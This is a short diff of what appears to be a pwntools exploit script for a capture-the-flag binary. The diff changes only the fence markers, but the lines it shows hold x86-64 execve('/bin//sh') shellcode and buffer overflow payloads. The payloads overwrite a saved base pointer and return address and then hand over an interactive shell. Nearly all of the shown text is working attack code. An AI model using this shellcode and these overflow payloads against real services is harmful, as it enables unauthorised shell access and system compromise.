@@ -9,7 +9,7 @@ shellcode = '\x48\x83\xEC\x40\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x6
 t.sendline('P' * 40 + p64(0x6020A0) + shellcode)
 t.interactive()
 
-```
+'''
 # alternative
 sc = "\x48\x31\xf6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
 
@@ -23,4 +23,4 @@ p.sendline(sc)
 p.sendline('1')
 p.sendline(filler+saved_rbp+ret_addr)
 p.interactive()
-```
+'''
